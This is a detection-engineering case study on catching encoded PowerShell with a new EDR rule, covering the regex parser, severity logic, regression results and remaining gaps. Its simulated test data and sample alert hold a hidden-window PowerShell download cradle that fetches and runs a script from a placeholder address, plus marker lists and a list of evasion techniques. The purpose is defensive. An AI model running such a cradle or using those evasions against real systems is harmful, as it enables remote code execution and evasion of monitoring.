# Case study 02: improving encoded PowerShell detection

**Analyst:** Alvin Thomas
**Sensor:** [03 EDR canary and process tree](../../03-edr-canary-process-tree/)
**Change:** new rule EDR-PT-005, a proper `-EncodedCommand` parser that replaces the substring markers, and a severity floor for auto-containment

## What is real and what is simulated

| Part | Status |
|---|---|
| Rule logic, before and after | **Real code.** The "before" results come from the sensor as it was. The "after" results come from the changed code in this repository. |
| Test cases ([`encoded_powershell_cases.ndjson`](../../03-edr-canary-process-tree/tests/fixtures/encoded_powershell_cases.ndjson)) | **Simulated.** I wrote nine labelled cases, plus the parent processes they need. The payloads are harmless strings I encoded myself (`Get-Date`, `Get-Service CcmExec | Select-Object Status`). The download cradle points at `203.0.113.10`, an address reserved for documentation. |
| Before and after tables | **Real output** from [`scripts/Invoke-RuleRegression.ps1`](../../03-edr-canary-process-tree/scripts/Invoke-RuleRegression.ps1), run against each version of the code. |
| Management-agent behaviour | **Assumed, not measured.** I have no fleet baseline. The parent lists are starting points that need tuning against local data. |
| Live Windows lab validation | **Not done yet.** |

## 1. Why I looked at this

In [case study 01](01-maldoc-to-ransomware-investigation.md), the sensor's handling of encoded PowerShell was a plain substring check. The rule file listed `-enc` and `-encodedcommand` as markers. A marker only raised the severity of a rule that had **already** fired on the parent-child relationship (Office spawning a shell, and so on). That gave me three concerns:

1. PowerShell accepts any unambiguous prefix of a parameter name. `-e`, `-ec`, `-en`, `-enco` and `/enc` all mean `-EncodedCommand`. The substring `-enc` misses `-e` and `-ec`, and those two are common in real attack tooling.
2. The substring `-enc` also matches `-Encoding`, an ordinary parameter of `Get-Content`, `Import-Csv`, `Out-File` and others. Any Office macro that read a CSV as UTF-8 was being pushed from high to critical.
3. Encoded PowerShell started by anything other than an Office app, a script host or a web server raised **nothing at all**. That includes PowerShell started through WMI, the classic remote-execution path.

An encoded command alone does not prove the activity is malicious. Software distribution agents, monitoring tools and installers use `-EncodedCommand` because it avoids quoting problems. So I did not want "any encoded command" to become a critical alert. I wanted the encoding found reliably, decoded so the analyst can read it, and its severity set by context.

## 2. Missed behaviour: before

I ran `./scripts/Invoke-RuleRegression.ps1` against the original code:

```text
Case                                                Pid Rule       Severity Markers
M1 WMI remote exec, -e short flag, download cradle 5001 -          no alert
M2 user-launched, -ec short flag                   5101 -          no alert
M3 pwsh with /enc                                  5151 -          no alert
M4 Office child, -e flag (escalation missed)       5201 EDR-PT-001 high
B1 -Encoding parameter, user shell                 5301 -          no alert
B2 -Encoding parameter, Office child               5401 EDR-PT-001 critical -enc
B3 SCCM client running an encoded inventory script 5501 -          no alert
B4 -ExecutionPolicy, script file                   5601 -          no alert
B5 -ep and a file named enc.ps1                    5701 -          no alert
```

- **M1** is the worst miss: `wmiprvse.exe -> powershell -NoP -NonI -W Hidden -e <IEX download cradle>`, which is what remote execution through WMI looks like. No alert.
- **M4** fired, but at high. The `-e` flag was missed, and the cradle inside the payload was invisible because nothing decoded it.
- **B2** is a false escalation. `Import-Csv ... -Encoding UTF8` under Excel became critical because `-Encoding` contains `-enc`.

## 3. Context that changes my assessment

This is how I reason about an encoded PowerShell command. The rule encodes the parts the sensor can observe.

| Context | What it tells me | Effect in EDR-PT-005 |
|---|---|---|
| Parent is a known management agent (`ccmexec.exe`, `agentexecutor.exe`) | Probably sanctioned automation. These agents also routinely pass `-ExecutionPolicy Bypass` and hidden windows, so those flags carry no weight here | Set to **low**. Only a marker in the **decoded payload** (download, `IEX`, a URL) raises it, and then only to medium |
| Parent is a remote-execution host (`wmiprvse.exe`, `wsmprovhost.exe`, `services.exe`) | Someone started this from another machine: WMI, WinRM or a newly created service. Lateral movement looks like this | Raised one level |
| Parent is the user's shell or anything else | Could be an admin testing something, or a user tricked into pasting a command | Base **medium** |
| Decoded payload contains `downloadstring`, `iex`, `http://` and similar | The payload pulls and runs more code. This is the strongest single signal | Raised one level |
| Wrapper flags (`-w hidden`, `bypass`) without a management parent | Weak alone, meaningful together with the rest | Raised one level (counted once together with payload markers) |
| Office, script-host or web-server parent | Already covered by EDR-PT-001 to 004 | PT-005 stays silent, and the parent-child rule takes the new markers instead (no duplicate alert) |

**User and host context** would change my assessment further, but the sensor does not record it today. A service account or SYSTEM running encoded PowerShell on a server under a management agent is normal. A standard user's interactive session on a workstation doing the same is not. The ETW process events I collect have no user SID, so this stays a manual triage step. I list it under the misses below.

## 4. The rule change

**Parsing.** I replaced the substrings with one regular expression in `Rules.ps1`. It matches every accepted abbreviation of `-EncodedCommand`, introduced by `-`, `/` or a typographic dash, and requires whitespace and a Base64 argument after the flag:

```powershell
'(?i)(?:^|\s)[-/\u2013\u2014](?:ec|e(?:n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?)?)?)?)?)?)?)?)\s+["'']?([A-Za-z0-9+/]{8,}={0,2})'
```

Requiring whitespace after the flag is what keeps `-Encoding`, `-ExecutionPolicy` and `-EncodedArguments` out. `Get-EdrEncodedCommand` then decodes the argument as UTF-16LE. `Get-EdrCommandLineMarker` checks the decoded text against the same marker list and reports any hits with a `decoded:` prefix, so the analyst can see whether a marker came from the command line or from inside the payload.

**Rule content** (`config/rules.psd1`, kept as data so the parent lists can be tuned without touching code):

```powershell
EncodedPowerShell = @{
    Id                = 'EDR-PT-005'
    Name              = 'Encoded PowerShell command'
    Severity          = 'medium'
    Images            = @('powershell.exe', 'pwsh.exe')
    ManagementParents = @('ccmexec.exe', 'agentexecutor.exe')
    RemoteExecParents = @('wmiprvse.exe', 'wsmprovhost.exe', 'services.exe')
    Mitre             = @('T1059.001', 'T1027')
}
```

**Containment floor.** `Containment.MinSeverity = 'high'`. Auto-containment no longer acts on low or medium alerts. Without this, a low PT-005 alert on a Configuration Manager script would have suspended it when `EDR_AUTO_CONTAIN` was on. Note: this also means the medium EDR-PT-003 (script host spawning a shell) is no longer auto-contained. I accept that, for the same reason.

**Alert content.** Alerts now carry `edr.decoded_command`, capped at 1,024 characters, so the analyst does not have to decode the payload by hand.

## 5. Benign regression cases and the result: after

The same command, against the changed code:

```text
Case                                                Pid Rule       Severity Markers
M1 WMI remote exec, -e short flag, download cradle 5001 EDR-PT-005 high     -w hidden, encodedcommand, decoded:downloadstring, decoded:iex , decoded:http://
M2 user-launched, -ec short flag                   5101 EDR-PT-005 medium   encodedcommand
M3 pwsh with /enc                                  5151 EDR-PT-005 medium   encodedcommand
M4 Office child, -e flag (escalation missed)       5201 EDR-PT-001 critical encodedcommand, decoded:downloadstring, decoded:iex , decoded:http://
B1 -Encoding parameter, user shell                 5301 -          no alert
B2 -Encoding parameter, Office child               5401 EDR-PT-001 high
B3 SCCM client running an encoded inventory script 5501 EDR-PT-005 low      bypass, encodedcommand
B4 -ExecutionPolicy, script file                   5601 -          no alert
B5 -ep and a file named enc.ps1                    5701 -          no alert
```

| Case | Before | After | Verdict |
|---|---|---|---|
| M1 WMI + `-e` + cradle | nothing | PT-005 high | Fixed miss |
| M2 user shell + `-ec` | nothing | PT-005 medium | Fixed miss |
| M3 `pwsh /enc` | nothing | PT-005 medium | Fixed miss |
| M4 Word + `-e` + cradle | PT-001 high | PT-001 critical | Fixed missed escalation |
| B1 `-Encoding`, user shell | nothing | nothing | Unchanged (correct) |
| B2 `-Encoding`, Excel child | PT-001 critical | PT-001 high | Removed false escalation. It is still high, because Excel starting PowerShell is worth a look by itself |
| B3 Configuration Manager + `-ExecutionPolicy Bypass` + encoded | nothing | PT-005 low, not contained | New, deliberately low-noise visibility |
| B4 `-ExecutionPolicy RemoteSigned -File` | nothing | nothing | Unchanged (correct) |
| B5 `-ep bypass -File C:\Scripts\enc.ps1` | nothing | nothing | Unchanged (correct) |

The [case study 01](01-maldoc-to-ransomware-investigation.md) recording gives the same four rules, the same counts and the same severities before and after. The only differences are the marker names and the corrected wording of the depth-2 message.

**The resulting alert for M1** (event id and host name replaced to keep it readable):

```json
{
  "@timestamp": "2026-10-27T10:00:02.000Z",
  "message": "[HIGH] Encoded PowerShell command: powershell.exe (PID 5001) ran an encoded command; remote execution parent 'wmiprvse.exe'",
  "event": { "severity": 73 },
  "rule": { "id": "EDR-PT-005", "name": "Encoded PowerShell command" },
  "threat": { "technique": { "id": ["T1059.001", "T1027"] } },
  "process": {
    "pid": 5001,
    "name": "powershell.exe",
    "command_line": "powershell.exe -NoP -NonI -W Hidden -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBj...",
    "parent": { "name": "wmiprvse.exe", "pid": 5000 }
  },
  "edr": {
    "ancestry": "wmiprvse.exe(5000) -> powershell.exe(5001)",
    "markers": ["-w hidden", "encodedcommand", "decoded:downloadstring", "decoded:iex ", "decoded:http://"],
    "decoded_command": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')"
  }
}
```

## 6. Why these severities

- **Medium base.** An encoded command is a reason to look, not proof. At medium it reaches the queue without paging anyone, and it stays below the containment floor.
- **Low, not suppressed, for management agents.** The parent match uses the image name only, so a binary renamed to `ccmexec.exe` would get the low rating. Suppressing it would make that rename a perfect bypass. At low, it still lands in the alert log, where [06 alert clustering](../../06-alert-clustering-fp-reducer/) can group the expected daily volume and flag outliers.
- **High at most.** Even M1 (WMI parent, hidden window, download cradle) stops at high. Two steps up from medium would reach critical, but a command line only shows **intent**. It does not show that the download worked or what the stage did. I keep critical for behaviour I have actually seen: an Office parent chain, mass file modification, or canary contact. M4 reaches critical through EDR-PT-001, where the Office parent supplies that extra context.
- **The containment floor goes with this.** Because PT-005 can produce low and medium alerts, auto-containment has to stop at high. Otherwise the new visibility would come with new outages.

## 7. What the rule still misses

I would rather list these myself than have a reviewer find them:

| Gap | Why it gets through |
|---|---|
| Renamed PowerShell (`C:\Users\Public\notepad.exe -e ...`) | The rule keys on the image name. Fixing this needs the PE original filename, which the sensor does not record |
| PowerShell hosted in another process (`System.Management.Automation` loaded by a custom binary, or `rundll32` with PowerShdll) | There is no `powershell.exe` process to inspect. Needs script-block logging (Event ID 4104) or image-load events |
| `-EncodedArguments` (pwsh 7) | Excluded on purpose to keep the regex precise. Low prevalence, but worth adding as its own pattern |
| Payload split across quoted arguments, or command lines over 8,191 characters | The regex reads one contiguous Base64 token |
| Obfuscation inside the decoded text (string concatenation, `-join`, `[char]` arrays) | Decoded-marker matching is substring-based. `'Down'+'loadString'` gets past it. Script-block logging sees the de-obfuscated form |
| A non-encoded but obfuscated launch (`powershell -c "IEX(...)"`) | Not this rule's job. The parent-child rules and the `iex(` marker cover part of it |
| Parent PID spoofing (`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`) | The kernel reports the spoofed parent, so a WMI-launched payload can claim `explorer.exe` and drop to medium |
| User and logon context | Not recorded by the sensor today (see section 3) |

## 8. Validation evidence

| Capability | Evidence | Kind |
|---|---|---|
| Flag parsing and decoding | `tests/EncodedPowerShell.Tests.ps1`: 8 accepted abbreviations, 5 near misses that must not match, invalid Base64 | Unit tests (Pester) |
| Severity from parent context | Same file: 6 parent cases, an unknown parent, plain PowerShell with no encoding | Unit tests (Pester) |
| Alert content and containment floor | Same file: `decoded_command` in the alert, and a low alert with auto-containment on that is not suspended | Pipeline tests (Pester) |
| Before and after behaviour | `Invoke-RuleRegression.ps1` on `encoded_powershell_cases.ndjson`. The output is section 5, and the last Pester test asserts every row | Replay |
| No regression on case study 01 | `Invoke-SafeSimulation.ps1` summary unchanged. Existing pipeline and auto-containment tests unchanged | Replay |
| Live Windows endpoint | Not yet run | Live lab |
| Real management-agent volume | Not measured. Needs a fleet baseline | Live environment |

To reproduce, from `03-edr-canary-process-tree/`:

```powershell
./scripts/Invoke-RuleRegression.ps1 | Format-Table -AutoSize
Invoke-Pester ./tests/EncodedPowerShell.Tests.ps1 -Output Detailed
```
